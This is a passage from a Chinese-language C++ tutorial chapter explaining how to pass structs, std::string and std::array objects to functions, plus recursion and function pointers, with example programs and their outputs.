std::endl; return 0.0; &#125; // 使用箭头运算符 -&gt; 访问成员 return rect_ptr-&gt;width * rect_ptr-&gt;height; // 或者使用 (*rect_ptr).width * (*rect_ptr).height&#125;// 函数原型：接收指向 Rectangle 的指针，并修改其尺寸 (放大)void scale_rectangle(Rectangle* rect_ptr, double factor) &#123; if (rect_ptr == nullptr || factor &lt;= 0) &#123; std::cerr &lt;&lt; &quot;Error: Invalid arguments for scale_rectangle.&quot; &lt;&lt; std::endl; return; &#125; rect_ptr-&gt;width *= factor; // 修改原始结构 rect_ptr-&gt;height *= factor; // 修改原始结构&#125;// 辅助函数：打印 Rectangle (按指针传递，使用 const)void print_rectangle(const Rectangle* rect_ptr) &#123; if (rect_ptr == nullptr) return; std::cout &lt;&lt; &quot;Rectangle [Width=&quot; &lt;&lt; rect_ptr-&gt;width &lt;&lt; &quot;, Height=&quot; &lt;&lt; rect_ptr-&gt;height &lt;&lt; &quot;]&quot;;&#125;int main() &#123; Rectangle box = &#123;10.0, 5.0&#125;; std::cout &lt;&lt; &quot;Original Box: &quot;; print_rectangle(&amp;box); std::cout &lt;&lt; std::endl; // 传递 box 的地址给 calculate_area double area = calculate_area(&amp;box); std::cout &lt;&lt; &quot;Area: &quot; &lt;&lt; area &lt;&lt; std::endl; // 输出: 50 // 传递 box 的地址给 scale_rectangle 以修改它 scale_rectangle(&amp;box, 2.0); // 放大两倍 std::cout &lt;&lt; &quot;Scaled Box: &quot;; print_rectangle(&amp;box); // 打印修改后的原始 box std::cout &lt;&lt; std::endl; // 输出: Rectangle [Width=20, Height=10] // 重新计算面积 area = calculate_area(&amp;box); std::cout &lt;&lt; &quot;New Area: &quot; &lt;&lt; area &lt;&lt; std::endl; // 输出: 200 return 0;&#125; 按指针传递的优缺点: 优点: 效率高，只传递地址，不复制整个结构。 允许函数修改原始结构数据。 缺点: 语法稍复杂（需要使用 &amp; 获取地址，使用 -&gt; 或 (*). 访问成员）。 可能意外修改原始数据（除非使用 const）。 需要处理空指针的可能性。 按引用传递 (Pass by Reference): C++ 还提供了另一种避免复制并允许修改原始数据的方式：按引用传递。这将在第 8 章详细介绍。按引用传递通常比按指针传递更简洁、更安全（因为它通常不涉及空引用的概念）。 123456789101112131415161718192021222324// 示例：按引用传递 (将在第 8 章详细讲解)#include &lt;iostream&gt;struct Circle &#123; double radius; &#125;;// 参数是 Circle 的引用 (别名)double circle_area_ref(const Circle&amp; c) &#123; // 使用 const 引用避免复制且不修改 return 3.14159 * c.radius * c.radius;&#125;void scale_circle_ref(Circle&amp; c, double factor) &#123; // 使用非 const 引用允许修改 if (factor &gt; 0) &#123; c.radius *= factor; // 直接用 . 访问成员，修改原始对象 &#125;&#125;int main() &#123; Circle circ = &#123;5.0&#125;; std::cout &lt;&lt; &quot;Area: &quot; &lt;&lt; circle_area_ref(circ) &lt;&lt; std::endl; scale_circle_ref(circ, 3.0); std::cout &lt;&lt; &quot;New Radius: &quot; &lt;&lt; circ.radius &lt;&lt; std::endl; // 输出: 15 std::cout &lt;&lt; &quot;New Area: &quot; &lt;&lt; circle_area_ref(circ) &lt;&lt; std::endl; return 0;&#125; 总结: 结构默认按值传递给函数（创建副本）。 函数可以按值返回结构（返回副本）。 为提高效率或允许修改原始结构，可以传递结构的地址（指针 struct_type*），使用 -&gt; 访问成员。 使用 const 配合指针（或引用）可以防止函数意外修改结构。 按引用传递 (struct_type&amp;) 是另一种常用的高效传递方式，通常更受欢迎。 7.7 函数和 string 对象C++ 标准库提供的 std::string 类是处理字符串的现代、更安全、更方便的方式，它与 C-风格字符串（字符数组）有很大不同。将 std::string 对象传递给函数或从函数返回它们，其行为更像结构体，但也受益于 C++ 的引用特性。 传递 std::string 对象与结构类似，std::string 对象默认也是按值传递 (Pass by Value)**。这意味着当将一个 string 对象传递给函数时，会创建该对象的一个副本**。 示例：按值传递 std::string 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;string&gt; // 包含 string 头文件// 函数：按值接收 string 对象void display_string_value(std::string str) &#123; // str 是 message 的副本 std::cout &lt;&lt; &quot;Inside function (value): \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 修改副本，不影响原始 string str[0] = &#x27;J&#x27;; std::cout &lt;&lt; &quot;Modified copy inside function: \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl;&#125;int main() &#123; std::string message = &quot;Hello&quot;; std::cout &lt;&lt; &quot;Before call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; display_string_value(message); std::cout &lt;&lt; &quot;After call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 原始 string 未改变 return 0;&#125; 输出: 1234Before call: &quot;Hello&quot;Inside function (value): &quot;Hello&quot;Modified copy inside function: &quot;Jello&quot;After call: &quot;Hello&quot; 按值传递 std::string 的问题: 虽然按值传递可以保护原始数据，但 std::string 对象可能存储很长的字符串。每次调用函数都复制整个字符串（包括其内部可能动态分配的内存）可能会导致显著的性能开销。 按引用传递 std::string为了避免复制开销并允许函数修改原始 string 对象，可以使用**按引用传递 (Pass by Reference)**。 示例：按引用传递 std::string 1234567891011121314151617181920#include &lt;iostream&gt;#include &lt;string&gt;// 函数：按引用接收 string 对象void modify_string_ref(std::string&amp; str_ref) &#123; // str_ref 是 message 的别名 std::cout &lt;&lt; &quot;Inside function (reference): \\&quot;&quot; &lt;&lt; str_ref &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 修改引用，会直接修改原始 string str_ref += &quot; World&quot;; std::cout &lt;&lt; &quot;Modified original via reference: \\&quot;&quot; &lt;&lt; str_ref &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl;&#125;int main() &#123; std::string message = &quot;Hello&quot;; std::cout &lt;&lt; &quot;Before call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; modify_string_ref(message); // 传递引用 std::cout &lt;&lt; &quot;After call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 原始 string 已被修改 return 0;&#125; 输出: 1234Before call: &quot;Hello&quot;Inside function (reference): &quot;Hello&quot;Modified original via reference: &quot;Hello World&quot;After call: &quot;Hello World&quot; 按常量引用传递 std::string (推荐方式)如果函数需要读取 string 的内容但不需要修改它，最佳实践是使用**按常量引用传递 (Pass by Constant Reference)**。这提供了按引用传递的效率（避免复制），同时具有按值传递的安全性（防止函数修改原始数据）。 示例：按常量引用传递 std::string 12345678910111213141516171819202122#include &lt;iostream&gt;#include &lt;string&gt;// 函数：按常量引用接收 string 对象void display_string_const_ref(const std::string&amp; str_cref) &#123; // str_cref 是 message 的常量别名 std::cout &lt;&lt; &quot;Inside function (const reference): \\&quot;&quot; &lt;&lt; str_cref &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // str_cref[0] = &#x27;J&#x27;; // 错误！不能通过常量引用修改对象 std::cout &lt;&lt; &quot;String length: &quot; &lt;&lt; str_cref.length() &lt;&lt; std::endl;&#125;int main() &#123; std::string message = &quot;Hello C++&quot;; std::cout &lt;&lt; &quot;Before call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; display_string_const_ref(message); // 传递常量引用 std::cout &lt;&lt; &quot;After call: \\&quot;&quot; &lt;&lt; message &lt;&lt; &quot;\\&quot;&quot; &lt;&lt; std::endl; // 原始 string 未改变 // 也可以传递字符串字面值，它们会自动转换为临时的 string 对象 display_string_const_ref(&quot;Temporary String&quot;); return 0;&#125; 输出: 123456Before call: &quot;Hello C++&quot;Inside function (const reference): &quot;Hello C++&quot;String length: 9After call: &quot;Hello C++&quot;Inside function (const reference): &quot;Temporary String&quot;String length: 16 总结传递方式: 按值 (std::string str): 创建副本，安全但可能低效。 按引用 (std::string&amp; str): 不创建副本，高效，允许修改原始对象。 按常量引用 (const std::string&amp; str): 不创建副本，高效，不允许修改原始对象。这是将字符串传递给函数进行只读访问的最常用和推荐的方式。 返回 std::string 对象函数也可以返回 std::string 对象。通常直接按值返回即可。 1234567891011121314151617#include &lt;iostream&gt;#include &lt;string&gt;// 函数：创建一个问候语字符串并返回std::string create_greeting(const std::string&amp; name) &#123; std::string result = &quot;Hello, &quot; + name + &quot;!&quot;; return result; // 返回 string 对象&#125;int main() &#123; std::string user_name = &quot;Alice&quot;; std::string greeting = create_greeting(user_name); std::cout &lt;&lt; greeting &lt;&lt; std::endl; // 输出: Hello, Alice! return 0;&#125; 虽然看起来这里也涉及复制（返回 result 的副本），但现代 C++ 编译器通常会应用返回值优化 (RVO) 或**命名返回值优化 (NRVO)**。这些优化可以避免在返回 string（或其他对象）时进行实际的复制，使得按值返回 std::string 非常高效。 与 C-风格字符串的比较: 使用 std::string 对象与函数交互比使用 C-风格字符串 (char*) 简单得多： 不需要担心空字符 \\0。 不需要手动管理内存（new/delete[]）。 不需要单独传递大小（string 对象知道自己的大小）。 按引用（尤其是常量引用）传递避免了复制开销，同时保持了代码的清晰和安全。 返回值优化使得按值返回 string 通常很高效。 因此，在现代 C++ 中，强烈推荐使用 std::string 而不是 C-风格字符串来处理文本数据。 7.8 函数与 array 对象C++11 引入了 std::array 模板类（在 &lt;array&gt; 头文件中定义），它提供了一种更安全、更方便的方式来表示固定大小的数组。与 C 风格数组会“退化”成指针不同，std::array 对象表现得更像普通的类对象（类似于结构体）。 关键特性: std::array 封装了一个固定大小的 C 风格数组。 其大小是类型信息的一部分（例如 std::array&lt;int, 5&gt; 和 std::array&lt;int, 10&gt; 是不同的类型）。 它提供了成员函数（如 size(), at(), front(), back()）和对迭代器的支持。 它不会自动退化为指针。 传递 std::array 对象由于 std::array 表现得像一个对象，它默认是按值传递 (Pass by Value) 给函数的。这意味着当将一个 array 对象传递给函数时，会创建该对象的完整副本。 示例：按值传递 std::array 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;#include &lt;array&gt; // 包含 array 头文件#include &lt;numeric&gt; // 为了 std::accumulate// 定义一个包含 5 个 double 的 array 类型别名using FiveDoubles = std::array&lt;double, 5&gt;;// 函数：按值接收 array 对象，计算总和// arr 是 data 的副本double sum_array_value(FiveDoubles arr) &#123; std::cout &lt;&lt; &quot;Inside function (value): Modifying copy...&quot; &lt;&lt; std::endl; arr[0] = 1000.0; // 修改副本，不影响原始 array double sum = 0.0; for (double x : arr) &#123; sum += x; &#125; // 或者使用 std::accumulate(arr.begin(), arr.end(), 0.0); return sum;&#125;int main() &#123; FiveDoubles data = &#123;1.1, 2.2, 3.3, 4.4, 5.5&#125;; std::cout &lt;&lt; &quot;Before call, data[0] = &quot; &lt;&lt; data[0] &lt;&lt; std::endl; double total = sum_array_value(data); std::cout &lt;&lt; &quot;After call, data[0] = &quot; &lt;&lt; data[0] &lt;&lt; std::endl; // 原始 array 未改变 std::cout &lt;&lt; &quot;Sum calculated by value: &quot; &lt;&lt; total &lt;&lt; std::endl; return 0;&#125; 输出: 1234Before call, data[0] &#x3D; 1.1Inside function (value): Modifying copy...After call, data[0] &#x3D; 1.1Sum calculated by value: 1015.4 按值传递 std::array 的问题: 与 std::string 和大型结构体类似，如果 std::array 很大，按值传递会复制整个数组内容，导致性能开销。 按引用传递 std::array为了避免复制开销并允许函数修改原始 array 对象，可以使用**按引用传递 (Pass by Reference)**。 示例：按引用传递 std::array 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;#include &lt;array&gt;using FiveDoubles = std::array&lt;double, 5&gt;;// 函数：按引用接收 array 对象，并将所有元素乘以因子// arr_ref 是 data 的别名void scale_array_ref(FiveDoubles&amp; arr_ref, double factor) &#123; std::cout &lt;&lt; &quot;Inside function (reference): Scaling original array...&quot; &lt;&lt; std::endl; for (double&amp; x : arr_ref) &#123; // 使用引用访问元素以修改它们 x *= factor; &#125;&#125;int main() &#123; FiveDoubles data = &#123;1.0, 2.0, 3.0, 4.0, 5.0&#125;; std::cout &lt;&lt; &quot;Before call: &quot;; for (double x : data) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; std::cout &lt;&lt; std::endl; scale_array_ref(data, 10.0); // 传递引用 std::cout &lt;&lt; &quot;After call: &quot;; for (double x : data) std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; // 原始 array 已被修改 std::cout &lt;&lt; std::endl; return 0;&#125; 输出: 123Before call: 1 2 3 4 5Inside function (reference): Scaling original array...After call: 10 20 30 40 50 按常量引用传递 std::array (推荐方式)如果函数只需要读取 array 的内容而不需要修改它，最佳实践是使用**按常量引用传递 (Pass by Constant Reference)**。这提供了效率（避免复制）和安全性（防止修改）。 示例：按常量引用传递 std::array 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;array&gt;using FiveDoubles = std::array&lt;double, 5&gt;;// 函数：按常量引用接收 array 对象，并打印它// arr_cref 是 data 的常量别名void print_array_const_ref(const FiveDoubles&amp; arr_cref) &#123; std::cout &lt;&lt; &quot;Inside function (const reference): Array elements are: &quot;; // arr_cref[0] = 0.0; // 错误！不能通过常量引用修改 for (double x : arr_cref) &#123; std::cout &lt;&lt; x &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; &quot;(Size: &quot; &lt;&lt; arr_cref.size() &lt;&lt; &quot;)&quot; &lt;&lt; std::endl;&#125;int main() &#123; FiveDoubles data = &#123;1.1, 2.2, 3.3, 4.4, 5.5&#125;; print_array_const_ref(data); // 传递常量引用 // 原始 array 未改变 std::cout &lt;&lt; &quot;Back in main, data[0] = &quot; &lt;&lt; data[0] &lt;&lt; std::endl; return 0;&#125; 输出: 12Inside function (const reference): Array elements are: 1.1 2.2 3.3 4.4 5.5 (Size: 5)Back in main, data[0] &#x3D; 1.1 总结传递方式: 按值 (std::array&lt;T, N&gt; arr): 创建副本，安全但可能低效。 按引用 (std::array&lt;T, N&gt;&amp; arr): 不创建副本，高效，允许修改。 按常量引用 (const std::array&lt;T, N&gt;&amp; arr): 不创建副本，高效，不允许修改。这是将 array 传递给函数进行只读访问的最常用和推荐的方式。 返回 std::array 对象函数也可以返回 std::array 对象，通常按值返回。与 std::string 类似，编译器通常会应用 RVO/NRVO 来优化掉返回时的复制操作。 1234567891011121314151617181920212223242526#include &lt;iostream&gt;#include &lt;array&gt;#include &lt;cmath&gt; // for std::powusing ThreeInts = std::array&lt;int, 3&gt;;// 函数：创建一个包含 x, x^2, x^3 的 array 并返回ThreeInts create_powers(int x) &#123; ThreeInts result; result[0] = x; result[1] = static_cast&lt;int&gt;(std::pow(x, 2)); result[2] = static_cast&lt;int&gt;(std::pow(x, 3)); return result; // 返回 array 对象 (通常会被优化)&#125;int main() &#123; ThreeInts powers_of_5 = create_powers(5); std::cout &lt;&lt; &quot;Powers of 5: &quot;; for (int val : powers_of_5) &#123; std::cout &lt;&lt; val &lt;&lt; &quot; &quot;; // 输出: 5 25 125 &#125; std::cout &lt;&lt; std::endl; return 0;&#125; 与 C 风格数组的比较: 使用 std::array 与函数交互比使用 C 风格数组更优越： 大小是类型的一部分: 函数签名明确指定了期望的数组大小，提高了类型安全。例如，不能将 std::array&lt;int, 5&gt; 传递给期望 std::array&lt;int, 10&gt; 的函数。 无指针退化: std::array 不会退化为指针，避免了相关的混淆和错误。 传递方式明确: 像普通对象一样按值、按引用或按常量引用传递，语义清晰。 接口更丰富: 可以直接在函数内部使用 size(), at() 等成员函数。 因此，在需要固定大小数组的场景下，std::array 通常是比 C 风格数组更好的选择，尤其是在函数参数和返回值中使用时。 7.9 递归递归 (Recursion) 是一种编程技巧，其中函数直接或间接地调用自身来解决问题。递归函数将一个大问题分解为一个或多个与原问题相似但规模更小的子问题，直到问题规模小到可以直接解决（称为基线条件或基本情况）。 递归函数通常包含两个关键部分： 基线条件 (Base Case): 一个或多个停止递归的条件。当满足基线条件时，函数不再调用自身，而是返回一个确定的值或执行一个简单的操作。没有基线条件会导致无限递归，最终耗尽内存（栈溢出）。 递归步骤 (Recursive Step): 函数调用自身，但通常使用修改后的参数，使得问题规模向基线条件靠近。 7.9.1 包含一个递归调用的递归这是最简单的递归形式，函数在每次执行时最多调用自身一次。 示例：使用递归进行倒计时 123456789101112131415161718#include &lt;iostream&gt;// 递归函数：从 n 倒数到 1void countdown(int n) &#123; // 基线条件：当 n 小于等于 0 时，停止递归 if (n &lt;= 0) &#123; std::cout &lt;&lt; &quot;Blastoff!&quot; &lt;&lt; std::endl; &#125; else &#123; // 递归步骤：打印当前数字，然后调用自身处理 n-1 std::cout &lt;&lt; n &lt;&lt; &quot;...&quot; &lt;&lt; std::endl; countdown(n - 1); // 函数调用自身，问题规模减小 (n -&gt; n-1) &#125;&#125;int main() &#123; countdown(5); return 0;&#125; 输出: 1234565...4...3...2...1...Blastoff! 工作原理 (调用栈): main 调用 countdown(5)。 countdown(5) 打印 “5…”，然后调用 countdown(4)。 countdown(4) 打印 “4…”，然后调用 countdown(3)。 … 这个过程继续 … countdown(1) 打印 “1…”，然后调用 countdown(0)。 countdown(0) 满足基线条件 (n &lt;= 0)，打印 “Blastoff!” 并返回。 countdown(1) 返回。 countdown(2) 返回。 … 依次回溯 … countdown(5) 返回到 main。 每次函数调用都会在称为“调用栈”的内存区域中创建一个新的记录（栈帧），用于存储函数的局部变量和返回地址。当函数返回时，其栈帧被移除。 示例：使用递归计算阶乘 阶乘 n! 定义为 n * (n-1) * ... * 1，并且 0! = 1。 123456789101112131415161718192021#include &lt;iostream&gt;// 递归函数：计算 n 的阶乘unsigned long long factorial(int n) &#123; // 基线条件：0! = 1 if (n == 0) &#123; return 1; &#125; // 递归步骤：n! = n * (n-1)! else &#123; return n * factorial(n - 1); // 函数调用自身 &#125;&#125;int main() &#123; int num = 5; std::cout &lt;&lt; num &lt;&lt; &quot;! = &quot; &lt;&lt; factorial(num) &lt;&lt; std::endl; // 输出: 5! = 120 num = 0; std::cout &lt;&lt; num &lt;&lt; &quot;! = &quot; &lt;&lt; factorial(num) &lt;&lt; std::endl; // 输出: 0! = 1 return 0;&#125; 7.9.2 包含多个递归调用的递归在这种形式中，函数在一次执行中可能会调用自身多次。这通常用于解决可以分解为多个相同类型子问题的问题，例如树的遍历或某些数学序列的计算。 示例：使用递归计算斐波那契数列 斐波那契数列定义如下：F(0) = 0, F(1) = 1, F(n) = F(n-1) + F(n-2) for n &gt; 1。 1234567891011121314151617181920212223242526#include &lt;iostream&gt;// 递归函数：计算第 n 个斐波那契数unsigned long long fibonacci(int n) &#123; // 基线条件 if (n &lt;= 0) &#123; return 0; &#125; else if (n == 1) &#123; return 1; &#125; // 递归步骤：F(n) = F(n-1) + F(n-2) else &#123; // 函数调用自身两次 return fibonacci(n - 1) + fibonacci(n - 2); &#125;&#125;int main() &#123; int term = 10; std::cout &lt;&lt; &quot;Fibonacci(&quot; &lt;&lt; term &lt;&lt; &quot;) = &quot; &lt;&lt; fibonacci(term) &lt;&lt; std::endl; // 输出: Fibonacci(10) = 55 term = 6; std::cout &lt;&lt; &quot;Fibonacci(&quot; &lt;&lt; term &lt;&lt; &quot;) = &quot; &lt;&lt; fibonacci(term) &lt;&lt; std::endl; // 输出: Fibonacci(6) = 8 return 0;&#125; 工作原理和潜在问题: 计算 fibonacci(5) 的过程大致如下： 12345678910fibonacci(5) -&gt; fibonacci(4) + fibonacci(3) -&gt; (fibonacci(3) + fibonacci(2)) + (fibonacci(2) + fibonacci(1)) -&gt; ((fibonacci(2) + fibonacci(1)) + (fibonacci(1) + fibonacci(0))) + ((fibonacci(1) + fibonacci(0)) + 1) -&gt; (((fibonacci(1) + fibonacci(0)) + 1) + (1 + 0)) + ((1 + 0) + 1) -&gt; (((1 + 0) + 1) + (1 + 0)) + ((1 + 0) + 1) -&gt; ((1 + 1) + 1) + (1 + 1) -&gt; (2 + 1) + 2 -&gt; 3 + 2 -&gt; 5 (注意：实际计算 fibonacci(10) 会涉及更多层调用) 这种包含多个递归调用的实现方式（如此处的斐波那契）虽然直观地反映了数学定义，但效率可能非常低。例如，在计算 fibonacci(5) 时，fibonacci(3) 被计算了两次，fibonacci(2) 被计算了三次。随着 n 的增大，重复计算的次数呈指数级增长。 对于这类问题，迭代（使用循环）或其他优化技术（如记忆化，即存储已计算的结果）通常是更高效的解决方案。 递归的优缺点: 优点: 对于某些问题（如树遍历、分治算法），递归可以提供非常自然、简洁和易于理解的解决方案。 代码可以更接近问题的数学或逻辑描述。 缺点: 可能效率低下，特别是当存在大量重复计算或深度递归时。 每次函数调用都有开销（创建栈帧），可能导致性能问题。 深度递归可能耗尽调用栈空间，导致栈溢出错误。 调试递归函数可能比调试迭代函数更困难。 在选择使用递归还是迭代时，需要权衡代码的清晰度、简洁性与潜在的性能和内存消耗。 7.10 函数指针就像变量有地址，函数也有地址。函数指针 (Function Pointer) 就是一个指向函数内存地址的指针变量。通过函数指针，我们可以像调用普通函数一样调用它所指向的函数。函数指针的主要用途包括： 将函数作为参数传递给其他函数（例如，实现回调机制或策略模式）。 在运行时决定调用哪个函数。 构建函数表或调度表。 7.10.1 函数指针的基础知识声明函数指针: 声明函数指针时，必须指定它所指向的函数的返回类型和参数列表类型。这确保了类型安全，即函数指针只能指向具有匹配签名的函数。 语法: 1return_type (*pointer_name)(parameter_type_list); return_type: 函数指针指向的函数的返回类型。 pointer_name: 函数指针变量的名称。 parameter_type_list: 函数指针指向的函数的参数类型列表，用逗号分隔。 (*pointer_name): 括号是必需的，它表明 pointer_name 是一个指针。如果没有括号，return_type *pointer_name(parameter_type_list); 会被解释为一个返回 return_type* 类型的函数声明。 示例声明: 1234567891011// 声明一个名为 func_ptr 的函数指针// 它指向一个接受两个 int 参数并返回 int 的函数int (*func_ptr)(int, int);// 声明一个名为 process 的函数指针// 它指向一个接受 const char* 参数且无返回值 (void) 的函数void (*process)(const char*);// 声明一个名为 compare 的函数指针// 它指向一个接受两个 double 参数并返回 bool 的函数bool (*compare)(double, double); 初始化函数指针: 可以将函数的名称（不带括号）直接赋给具有匹配签名的函数指针。函数名本身就代表了函数的地址。 12345678int add(int a, int b) &#123; return a + b; &#125;void print_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;// 初始化 func_ptr 指向 add 函数func_ptr = add; // 或者 func_ptr = &amp;add; (&amp; 是可选的)// 初始化 process 指向 print_message 函数process = print_message; 使用函数指针调用函数: 可以通过函数指针来调用它所指向的函数，语法与直接调用函数类似。 123456int result = func_ptr(5, 3); // 调用 add(5, 3)，result 将是 8process(&quot;Hello via pointer!&quot;); // 调用 print_message(&quot;Hello via pointer!&quot;)// 也可以使用显式解引用语法 (较少见)// int result = (*func_ptr)(5, 3);// (*process)(&quot;Hello via pointer!&quot;); 7.10.2 函数指针示例下面是一个完整的示例，演示如何声明、初始化和使用函数指针。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;// 目标函数 1int add(int x, int y) &#123; return x + y;&#125;// 目标函数 2int subtract(int x, int y) &#123; return x - y;&#125;// 目标函数 3void display_result(int result) &#123; std::cout &lt;&lt; &quot;The result is: &quot; &lt;&lt; result &lt;&lt; std::endl;&#125;int main() &#123; // 声明一个指向接受两个 int 并返回 int 的函数的指针 int (*operation)(int, int); // 声明一个指向接受一个 int 且无返回值的函数的指针 void (*show)(int); // 将 operation 指向 add 函数 operation = add; std::cout &lt;&lt; &quot;Using &#x27;add&#x27; function via pointer:&quot; &lt;&lt; std::endl; int sum = operation(10, 5); // 调用 add(10, 5) std::cout &lt;&lt; &quot;10 + 5 = &quot; &lt;&lt; sum &lt;&lt; std::endl; // 输出: 15 // 将 operation 指向 subtract 函数 operation = subtract; std::cout &lt;&lt; &quot;\\nUsing &#x27;subtract&#x27; function via pointer:&quot; &lt;&lt; std::endl; int diff = operation(10, 5); // 调用 subtract(10, 5) std::cout &lt;&lt; &quot;10 - 5 = &quot; &lt;&lt; diff &lt;&lt; std::endl; // 输出: 5 // 将 show 指向 display_result 函数 show = display_result; std::cout &lt;&lt; &quot;\\nDisplaying difference using &#x27;show&#x27; pointer:&quot; &lt;&lt; std::endl; show(diff); // 调用 display_result(diff) return 0;&#125; 7.10.3 深入探讨函数指针函数指针作为函数参数: 一个常见的用途是将函数指针作为参数传递给另一个函数。这允许调用函数根据传入的函数指针来定制其行为。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;vector&gt;// 函数：检查一个数字是否为偶数bool is_even(int n) &#123; return n % 2 == 0;&#125;// 函数：检查一个数字是否为正数bool is_positive(int n) &#123; return n &gt; 0;&#125;// 函数：打印满足特定条件的数字// 参数：一个整数向量，一个函数指针 (指向检查条件的函数)void print_numbers_if(const std::vector&lt;int&gt;&amp; numbers, bool (*check)(int)) &#123; std::cout &lt;&lt; &quot;Numbers satisfying the condition: &quot;; for (int num : numbers) &#123; if (check(num)) &#123; // 使用传入的函数指针调用检查函数 std::cout &lt;&lt; num &lt;&lt; &quot; &quot;; &#125; &#125; std::cout &lt;&lt; std::endl;&#125;int main() &#123; std::vector&lt;int&gt; data = &#123;1, -2, 3, 4, -5, 6&#125;; std::cout &lt;&lt; &quot;Checking for even numbers:&quot; &lt;&lt; std::endl; print_numbers_if(data, is_even); // 传递 is_even 函数的地址 std::cout &lt;&lt; &quot;\\nChecking for positive numbers:&quot; &lt;&lt; std::endl; print_numbers_if(data, is_positive); // 传递 is_positive 函数的地址 return 0;&#125; 输出: 1234Checking for even numbers:Numbers satisfying the condition: -2 4 6Checking for positive numbers:Numbers satisfying the condition: 1 3 4 6 在这个例子中，print_numbers_if 函数的行为由传递给它的 check 函数指针决定。 7.10.4 使用 typedef 或 using 进行简化函数指针的声明语法可能比较冗长和复杂。可以使用 typedef (传统方式) 或 using (C++11 及以后推荐) 来创建函数指针类型的别名，使代码更清晰。 使用 typedef: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;// 使用 typedef 定义函数指针类型别名typedef bool (*CheckFunction)(int); // CheckFunction 是指向 (int) -&gt; bool 函数的指针类型typedef void (*DisplayFunction)(const char*);void print_if(int val, CheckFunction check, DisplayFunction display) &#123; if (check(val)) &#123; display(&quot;Condition met!&quot;); &#125; else &#123; display(&quot;Condition not met.&quot;); &#125;&#125;bool is_negative(int n) &#123; return n &lt; 0; &#125;void show_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;int main() &#123; CheckFunction checker = is_negative; // 使用别名声明和初始化 DisplayFunction printer = show_message; print_if(-5, checker, printer); // 输出: Condition met! print_if(10, checker, printer); // 输出: Condition not met. return 0;&#125; 使用 using (C++11): using 提供了更直观、更一致的别名语法。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;// 使用 using 定义函数指针类型别名 (推荐)using CheckFunction = bool (*)(int); // 指向 (int) -&gt; bool 函数的指针类型using DisplayFunction = void (*)(const char*);// ... (函数 print_if, is_negative, show_message 和 main 函数同上) ...void print_if(int val, CheckFunction check, DisplayFunction display) &#123; if (check(val)) &#123; display(&quot;Condition met!&quot;); &#125; else &#123; display(&quot;Condition not met.&quot;); &#125;&#125;bool is_negative(int n) &#123; return n &lt; 0; &#125;void show_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;int main() &#123; CheckFunction checker = is_negative; DisplayFunction printer = show_message; print_if(-5, checker, printer); print_if(10, checker, printer); return 0;&#125; 使用类型别名可以显著提高涉及函数指针的代码的可读性。 总结: 函数指针是 C++ 中一个强大的特性，它允许将函数视为数据进行传递和存储。虽然语法可能初看起来有些复杂，但通过 typedef 或 using 可以简化。理解函数指针对于掌握回调机制、某些设计模式以及与 C 库交互非常重要。在现代 C++ 中，函数对象（Functors）和 Lambda 表达式（将在后续章节介绍）提供了更灵活、有时更方便的替代方案，但函数指针仍然有其用武之地。 7.11 总结本章深入探讨了函数这一 C++ 编程的基本模块，涵盖了函数定义、调用、参数传递机制以及如何将函数与各种数据类型（数组、字符串、结构、对象）结合使用。 主要内容回顾： 函数基础: 复习了函数的定义（返回类型、名称、参数列表、函数体）、函数原型（声明函数接口以供编译器使用）和函数调用（执行函数代码）。 参数传递: 按值传递 (Pass by Value): C++ 的默认方式，适用于基本类型、结构和类对象。函数操作的是实参的副本，不影响原始数据，但可能因复制大型对象而效率低下。 数组传递: C 风格数组传递时会退化为指向首元素的指针，函数直接操作原始数组，效率高但丢失大小信息，需额外传递大小或使用指针区间。const 可用于保护数组内容。 二维数组传递: 必须在函数参数中指定除第一维之外的所有维度的大小。 结构传递: 默认按值传递。为提高效率或允许修改，可传递结构指针 (struct_type*)，使用 -&gt; 访问成员，或使用引用（第 8 章内容）。 std::string 和 std::array 对象传递: 默认按值传递，但通常推荐按常量引用 (const T&amp;) 传递以获得效率和安全性，或按引用 (T&amp;) 传递以允许修改。 函数与特定类型: C-风格字符串: 作为 char* 传递，依赖 \\0 结束符。返回 C 风格字符串比较复杂，推荐让调用者提供缓冲区。 std::string 对象: 使用 const std::string&amp; 传递是常用方式。返回 std::string 通常因 RVO/NRVO 而高效。 std::array 对象: 行为类似结构，大小是类型的一部分。推荐使用 const std::array&lt;T, N&gt;&amp; 传递。 递归: 函数调用自身来解决问题。需要明确的基线条件来停止递归，以及使问题规模缩小的递归步骤。递归可以使某些问题的代码简洁，但可能效率低或导致栈溢出。 函数指针: 指向函数地址的指针变量。允许将函数作为参数传递、在运行时选择函数等。声明时需匹配函数签名（返回类型和参数类型）。typedef 或 using 可简化其声明。 通过本章的学习，我们掌握了如何有效地定义和使用函数来构建模块化、可重用和可维护的 C++ 